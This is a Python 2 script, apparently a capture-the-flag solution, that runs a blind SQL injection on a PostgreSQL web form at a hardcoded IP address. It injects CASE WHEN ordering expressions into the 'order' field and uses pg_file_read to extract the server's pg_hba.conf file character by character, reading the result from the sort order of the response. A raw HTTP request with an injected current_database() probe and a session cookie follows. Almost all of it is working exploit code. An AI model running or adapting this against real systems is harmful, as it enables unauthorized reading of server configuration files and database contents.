#-*- coding: UTF-8 -*-
import requests
import string
import re

url = "http://200.136.213.109/"
guess = string.lowercase + string.uppercase + string.digits + string.punctuation + " +-*/"
cookie = {'JSESSIONID':'4EC5B5BDA7F2413321AC848E5D6E8E8C'}
all_results = []

for result_number in range(0,1):  	
	result=''
	for i in range(1,100):           	
		flag = 0
		for str1 in guess:				
			print "trying ",str1
			query = "case when(ascii(substr((pg_file_read('pg_hba.conf')),%d,1))=%d) then age end desc, case when 1=1 then age end asc"%(i,ord(str1))
			#print query
			data = {'name':'','age':'','crime':'','order':query,'submit':''}
			try:
				res=requests.post(url,cookies=cookie,data=data)
				#print res.content
				if(re.search(r'55[\s\S]*24',res.content)!=None):
					result += str1
					flag = 1
					print "scanning on the %d place,the result now is %s"%(result_number,result)
					break
			except Exception,e:
				print e
				pass
		if flag == 0:
			break;
	all_results.append(result)
	if i==1 and flag==0:
		print "scan finished"
		break
		
for i in range(len(all_results)):
	print all_results[i]


'''
POST http://200.136.213.109/ HTTP/1.1
Host: 200.136.213.109
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Referer: http://200.136.213.109/
Cookie: JSESSIONID=37C371E278ADE91A236C3A3FE13E0F5B
Connection: close
Upgrade-Insecure-Requests: 1

name=&age=&crime=&order=case when(ascii(substr((current_database()),1,1))=99) then age end desc, case when 1=1 then age end asc&submit=

'''